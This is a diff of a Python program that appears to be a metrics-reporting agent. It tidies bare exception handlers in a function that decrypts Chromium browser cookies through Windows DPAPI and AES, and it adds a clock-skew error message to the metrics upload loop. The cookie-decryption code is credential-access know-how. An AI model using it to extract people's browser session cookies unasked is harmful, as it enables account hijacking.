@@ -569,7 +569,7 @@ def decrypt_chromium_cookie(encrypted_value, browser_name="Chrome"):
                 pad_len = decrypted[-1]
                 if 1 <= pad_len <= 16:
                     return decrypted[:-pad_len].decode("utf-8")
-        except:
+        except Exception:
             pass
         return None
 
@@ -596,7 +596,7 @@ def decrypt_chromium_cookie(encrypted_value, browser_name="Chrome"):
                 buffer = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                 ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                 return buffer.decode("utf-8")
-        except:
+        except Exception:
             pass
         return None
 
@@ -605,7 +605,7 @@ def decrypt_chromium_cookie(encrypted_value, browser_name="Chrome"):
         try:
             try:
                 return encrypted_value.decode("utf-8")
-            except:
+            except Exception:
                 pass
             import hashlib
             from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -637,7 +637,7 @@ def decrypt_chromium_cookie(encrypted_value, browser_name="Chrome"):
                 pad_len = decrypted[-1]
                 if 1 <= pad_len <= 16:
                     return decrypted[:-pad_len].decode("utf-8")
-        except:
+        except Exception:
             pass
         return None
 
@@ -1225,7 +1225,16 @@ def main():
                 if success:
                     logging.info(f"Successfully sent {len(metrics)} metrics")
                 else:
-                    logging.error(f"Failed to send metrics (HTTP {code}): {result}")
+                    # Check for clock skew error (400 timestamp_expired)
+                    if code == 400 and isinstance(result, dict) and result.get("detail", {}).get("error") == "timestamp_expired":
+                        skew = result.get("detail", {}).get("skew_seconds", "?")
+                        logging.error("=" * 60)
+                        logging.error("⚠️  CLOCK SKEW DETECTED — REQUEST REJECTED")
+                        logging.error(f"Server reported skew of {skew} seconds.")
+                        logging.error("Please check NTP sync on this machine.")
+                        logging.error("=" * 60)
+                    else:
+                        logging.error(f"Failed to send metrics (HTTP {code}): {result}")
                     queue_push(payload)
             else:
                 logging.info("No metrics collected in this cycle")
